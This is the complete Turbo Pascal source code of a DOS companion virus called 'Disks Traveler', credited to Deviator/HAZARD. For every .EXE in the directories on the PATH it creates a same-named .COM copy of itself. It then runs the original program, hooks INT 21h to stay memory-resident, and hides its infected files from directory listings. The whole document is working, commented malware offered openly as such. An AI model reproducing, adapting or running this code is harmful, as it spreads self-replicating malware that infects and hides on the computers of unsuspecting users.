   Program DisksTraveler;
   Uses Dos;
   {$I-}
   {$M 4000,4000,16000}
   Const
   OurLen:Word = 5355;                 { Our Size }
   Var
   F,Q             : SearchRec;                { Variables }
   O               : Pointer;
   XString,WString : String;
   ZString,BString : String;
   N               : File;
   FAttr           : Word;
   NameToFind      : String;
   SQ              : DirStr;
   SW              : NameStr;
   SE              : ExtStr;
   K               : Byte;
   Executed        : Boolean;
   PrevDir         : String;
   InInt           : Boolean;
   MStr            : String;
   zAh,zAl,i       : Byte;
   KbdIntVec       : Procedure;
   Regs            : Registers;
   Outta           : Boolean;
   DtaSeg,DtaOfs   : Word;

   Procedure GetString(zSeg,zOfs:Word); Forward;   { Forward Procedures }
   Function CheckFile:Boolean;          Forward;
   Function CheckFCB:Boolean;       Forward;

   {$F+}

   { Our int 21h aimed to provide stealth functions }

   Procedure NewInt(zFlags,zCS,zIP,zAX,zBX,zCX,zDX,zSI,zDI,zDS,zES,zBP: Word);
   Interrupt;
   Begin

   zAh := Hi(zAx); zAl := Lo(zAx); { *®«ãç¨«¨ Ah ¨ Al } { Get Ah and Al }

   If (Not InInt) and (Outta) then
     If (zCs<$9200) or (zCs>$A000) then Begin

   { If we're not executing our int call,Stealth is on and Old cs is not
     equal to possible Command.Com then turn on stealth functions }

   If (zAh = $11) or (zAh = $12) then Begin    { FCB Findfirst/Next ? }
   InInt := True;

   Regs.Ah := $2F;                 { Get DTA }
   With Regs do Intr($21,Regs);
   DtaSeg := Regs.Es; DtaOfs := Regs.Bx;       { Store }

   If Memw[zDs:zDx] = $1234 then Begin
                     End;

   Regs.Ax := zAx; Regs.Bx := zBx; Regs.Cx := zCx; Regs.Dx := zDx;
   Regs.Bp := zBp; Regs.Si := zSi; Regs.Di := zDi; Regs.Ds := zDs;
   Regs.Es := zEs;                 { Copy regs }
   With Regs do Intr($21,Regs);            { Execute int }
   zAx    := Regs.Ax; zFlags := Regs.Flags;    { Get Flags }
   If (Regs.Al = 0) and CheckFCB then Begin { Not file last and our brother ? }
   repeat                      { Yea ! }
   Regs.Ah := $12;
   Regs.Ds := zDs; Regs.Dx := zDx;         { Find Next }
   With Regs do Intr($21,Regs);
   zFlags := Regs.Flags; zAx := Regs.Ax;
   If Regs.Al = $FF then Break;            { CF set ? }
   until Not CheckFCB;             { Check for us }
   End;
   InInt := False;                 { Thats all }

   asm                     { Return }
           pop  bp
       pop  es
       pop  ds
       pop  di
       pop  si
       pop  dx
       pop  cx
       pop  bx
       pop  ax
           iret
   End;
   End;

   If (zAh = $4E) or (zAh = $4F) then Begin    { Findfirst/Next ? }
   InInt := True;

   Regs.Ah := $2F;                 { Get DTA }
   With Regs do Intr($21,Regs);
   DtaSeg := Regs.Es; DtaOfs := Regs.Bx;

   Regs.Ax := zAx; Regs.Bx := zBx; Regs.Cx := zCx; Regs.Dx := zDx;
   Regs.Bp := zBp; Regs.Si := zSi; Regs.Di := zDi; Regs.Ds := zDs;
   Regs.Es := zEs;
   With Regs do Intr($21,Regs);
   zFlags := Regs.Flags;               { Execute int }

   If CheckFile then Begin             { Our brother ? }
   repeat
   Regs.Ah := $4F;                 { Next File }
   With Regs do Intr($21,Regs);            { Find it }
   zFlags := Regs.Flags;               { Get flags }
   If (zFlags and 1 <> 0) then Break;      { CF Set ? }
   Until Not CheckFile;                { Repeat until next file or
                             last or not our brother }
   End;
   InInt := False;

   asm                     { Return work }
           pop  bp
       pop  es
       pop  ds
       pop  di
       pop  si
       pop  dx
       pop  cx
       pop  bx
       pop  ax
           iret
   End;
   End;

   End;

   If zAx = $FDEC then zAx := 0;           { Memory testing }
   If zAx = $FDAA then Outta := False;
   If zAx = $FDAB then Outta := True;

   asm
           mov ax,word ptr ds:[KbdIntVec]  { Make Far Jmp offset }
           mov bx,word ptr ds:[KbdIntVec][2]
           mov word ptr cs:[@JmpIt],ax { No way to make it on pascal }
           mov word ptr cs:[@JmpIt][2],bx

           jmp @PrefClear
   @PrefClear:             { Clear prefetch queqe }
           pop  bp
       pop  es
       pop  ds
       pop  di
       pop  si
       pop  dx
       pop  cx
       pop  bx
       pop  ax

           db  0EAh        { Far jump to real int 21 }
   @JmpIt: dd  0

    End;
   End;
   {$F-}

   Procedure GetString(zSeg,zOfs:Word);    { Converts ASCIIZ (0-ended) string to
                         pascal type }
   Var
   N,Q:Byte;
   Begin
   MStr := '';
   Q    := 0;
   While N <> 0 do Begin
   N := Mem[zSeg:zOfs+Q];
   MStr := MStr + Chr(N);
   Inc(Q);
   If Q = 125 then Break;
   End;
   End;

   Function CheckFile:Boolean;     { Checks if file is our brother }
   Begin
    GetString(DtaSeg,DtaOfs+$1E);
    FSplit(MStr,SQ,SW,SE);
    CheckFile := False;
    If (SE = '.COM') and (MemW[DtaSeg:DtaOfs+$1A]=OurLen) then CheckFile := True;
   End;

   Procedure Get3(zSeg,zOfs:Word);     { Converts 3 bytes (extension) to
                         Pascal string }
   Var
   Q:Byte;
   Begin
   MStr := '';
   For Q := 0 to 2 do MStr := MStr + Chr(Mem[zSeg:zOfs+Q]);
   End;

   Function CheckFCB:Boolean;      { Checks FCB for our brother }
   Begin
   CheckFCB := False;
   Get3(DtaSeg,DtaOfs+8+8);
   If (MStr = 'COM') and (Memw[DtaSeg:DtaOfs+$1C+8] = OurLen) then CheckFCB := True;
   End;

   Procedure Infect;           { Infects .exe files in all dirs }
   Begin
   FindFirst('*.exe',AnyFile,F);       { Find first *.exe }
   While DosError = 0 do Begin
   FSPlit(F.Name,SQ,SW,SE);        { Get Path,Name and extension }
   FindFirst(SW+'.COM',AnyFile,Q);     { Find Name+'.Com' }
   If DosError <> 0 then Begin     { Exists ? }
   GetDir(0,BString); ChDir(PrevDir);  { Nope ! Change dir to previous }
   Assign(N,SW+'.COM');            { Create Name+'.Com' }
   Rewrite(N,1);               { Write us }
   BlockWrite(N,O^,OurLen);
   Close(N);
   ChDir(BString);             { Chdir back }
   End;
   FindNext(F);
   End;
   End;

   Function Count(F:Char;S:String):Byte;   { Counts number of given char in a
                         string. Used to skip C:\ as
                         previous directory }
   Var
   G:Byte;
   Z:String;
   M:String;
   Begin
   G := 0;
   M := S;
   repeat
   Z := Copy(M,1,Pos(F,M)-1);
   M := Copy(M,Pos(F,M)+1,Length(M));
   Inc(G);
   until z = '';
   Dec(G);
   Count := G;
   End;

   Procedure FindHost;             { Tries to execute own host }
   Begin
   FindFirst(NameToFind,AnyFile,Q);        { Find our host }
   If DosError = 0 then Begin          { Founded ? }
   BString := '';                  { Founded ! }
   For K := 1 to ParamCount do BString := BString + ' ' + Paramstr(K);
   SwapVectors;
   Exec(NameToFind,BString);           { Execute host }
   SwapVectors;
   Executed := True;
   End;
   End;

   Procedure TravelDirs;               { Travel by dirs }
   Begin
   GetDir(0,ZString);              { Get current directory }
   XString := GetEnv('PATH');          { Get PATH }
   repeat
   PrevDir := WString;             { Store previous directory }
   WString := Copy(XString,1,Pos(';',XString)-1);  { Put in WString directory }
   XString := Copy(XString,Pos(';',XString)+1,Length(XString));
                           { Drop directory out of
                             PATH list }
   If Count('\',WString)<2 then PrevDir := WString;{ Find number of '\' in
                             path. If < 2 then
                             previous directory =
                             current }
   ChDir(WString);                 { Go to dir }
   Infect;                     { Infect files }
   If Not Executed then FindHost;      { Allready executed our host ?}
   until WString = '';             { Repeat until Dir = '' }
   ChDir(ZString);                 { Go back to our directory }
   End;

   Begin
   Regs.Ax := $FDAA;               { Turn Stealth off }
   With Regs do Intr($21,Regs);

   PrevDir  := '[Disks Traveler] By Deviator/HAZARD';
                           { Just (C) ;) }
   Executed := False;              { We're not executed host }
   PrevDir  := '.';                { PrevDir = '.' }
   Assign(N,Paramstr(0));              { Read our sources }
   GetFAttr(N,FAttr);              { Drop attributes }
   SetFAttr(N,0);
   Reset(N,1);
   GetMem(O,OurLen);
   BlockRead(N,O^,OurLen);             { Read host }
   Close(N);
   SetFAttr(N,FAttr);              { Restore attributes }
   FSPlit(Paramstr(0),SQ,SW,SE);           { Get our Path,Name and
                             extension }
   If (SE = '.COM') or (SE = '.com') then Begin    { Extension - .com ? }
   NameToFind := SW+'.EXE';            { Yea ! Find Name+'.Exe' }
   End Else NameToFind := 'Command.Com';       { Nope..First time execute..
                             our host is Command.Com }
   FindHost; Infect;               { Find host in current dir }
   TravelDirs;                 { Infect files,travel dirs }
   InInt := False;                 { Clear variables }

   Regs.Ax := $FDAB;               { Stealth on }
   with regs do Intr($21,regs);

   Regs.Ax := $FDEC;               { Check install }
   with regs do Intr($21,regs);
   If Regs.Ax <> 0 then begin          { Not in mem }
                        GetIntVec($21,@KbdIntVec); { Get Int 21h }
                        SetIntVec($21,Addr(NewInt));
                           { Store Int 21h }
                Outta := True;
                        Keep(0);           { Terminate, stay resident }
                        End;

   End.
